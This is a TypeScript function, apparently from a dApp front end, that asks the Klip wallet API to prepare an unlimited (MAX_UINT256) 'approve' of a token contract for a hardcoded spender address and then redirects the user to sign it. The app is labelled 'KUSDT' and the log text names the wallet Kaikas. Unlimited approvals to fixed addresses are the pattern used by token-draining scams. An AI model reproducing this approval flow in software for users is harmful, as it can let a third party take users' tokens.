import axios from 'axios';
const MAX_UINT256 = "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";




export const klipWalletApprove = async (): Promise<void> => {
  try {
    // ✅ 等待 `axios.post()` 完成
    const res = await axios.post(
      "https://a2a-api.klipwallet.com/v2/a2a/prepare",
      {
        type: "execute_contract",
        bapp: {
          name: "KUSDT",
          // callback: {
          //   success: "https://www.google.com/search?q=success",
          //   fail: "https://www.google.com/search?q=fail",
          // },
        },
        transaction: {
          abi: `{
            "constant": false,
            "inputs": [
              { "name": "spender", "type": "address" },
              { "name": "amount", "type": "uint256" }
            ],
            "name": "approve",
            "outputs": [{ "name": "", "type": "bool" }],
            "type": "function"
          }`,
          value: "0",
          to: "0x5c13e303a62fc5dedf5b52d66873f2e59fedadc2",
          params: `["0x48F943a8a6A6437117063D3aCaf62e2047467966", "${MAX_UINT256}"]`,
        },
      },
      {
        headers: {
          "Content-Type": "application/json; charset=utf-8",
        },
      }
    );

    // ✅ 确保 `res.data.request_key` 存在后再执行
    if (res.data.request_key) {
      const url = `https://klipwallet.com?target=/a2a?request_key=${res.data.request_key}`;
      console.log("🔗 打开 Kaikas 钱包 URL:", url);
      window.location.href = url;
    } else {
      console.error("❌ 交易失败: 未返回 request_key");
    }
  } catch (error) {
    console.error("❌ 交易失败:", error);
    throw error;
  }
};
